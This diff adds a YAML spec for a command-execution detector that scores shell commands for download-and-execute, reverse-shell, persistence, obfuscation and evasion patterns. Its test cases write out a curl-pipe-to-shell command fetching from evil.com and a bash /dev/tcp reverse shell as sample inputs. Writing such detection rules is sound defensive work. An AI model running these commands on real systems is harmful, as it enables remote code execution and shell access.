@@ -1,0 +1,88 @@
+kind: detector
+name: execution_guard
+version: 1
+description: "Structural command analysis with behavioral risk scoring for suspicious execution patterns"
+
+context: |
+  Monitors shell.command_exec and sudo.command events. Assigns risk scores
+  to commands based on structural patterns, then emits incidents when the
+  cumulative score exceeds thresholds.
+
+  Risk score components:
+  - Download+execute (curl|sh): 40
+  - Network pipe: 35
+  - /tmp execution: 30
+  - Sudo escalation context: 25
+  - Reverse shell indicators: 50
+  - Persistence (crontab, .bashrc, systemctl enable): 20
+  - Obfuscation (base64|sh, eval): 30
+  - Defense evasion (timestomp, log tampering, LD_PRELOAD, ptrace): 40
+  - Sequence bonus (download -> chmod +x -> execute within window): 25
+
+  Score thresholds:
+  - <30: no incident
+  - 30-59: Low severity
+  - 60-79: High severity
+  - 80+: Critical severity
+
+  Key decisions:
+  - Per-user command timeline correlation catches multi-step attacks.
+  - Known downloaders, shell executors, and script interpreters identified.
+  - TMP_PREFIXES: /tmp/, /var/tmp/, /dev/shm/, /run/shm/
+  - Observe mode only (future: contain and strict modes).
+
+behavior:
+  does:
+    - "Assigns risk scores to commands based on structural patterns"
+    - "Correlates per-user command sequences (download -> chmod -> execute)"
+    - "Fires Low/High/Critical based on cumulative score"
+    - "Detects download+execute, reverse shells, obfuscation, persistence, defense evasion"
+  does_not:
+    - "Block command execution (observe mode only)"
+    - "Alert when score is below 30"
+    - "Alert on normal commands (ls, cat, cd)"
+
+config:
+  threshold_none: 30
+  threshold_low: 60
+  threshold_high: 80
+
+dependencies: []
+
+test_cases:
+  true_positives:
+    - description: "curl|sh (download+execute, score 40)"
+      input:
+        kind: "shell.command_exec"
+        command: "curl -fsSL http://evil.com/payload | sh"
+      expected:
+        alert: true
+        severity: "low"
+
+    - description: "Reverse shell command (score 50+)"
+      input:
+        kind: "shell.command_exec"
+        command: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+      expected:
+        alert: true
+        severity: "high"
+
+  true_negatives:
+    - description: "Normal ls command (score 0)"
+      input:
+        kind: "shell.command_exec"
+        command: "ls -la /tmp"
+      expected:
+        alert: false
+        reason: "Score below threshold"
+
+    - description: "Normal curl to HTTPS (score 0)"
+      input:
+        kind: "shell.command_exec"
+        command: "curl https://api.github.com/repos"
+      expected:
+        alert: false
+        reason: "No pipe to shell, no suspicious pattern"
+
+history:
+  - "2026-04-02: initial spec from source code analysis"
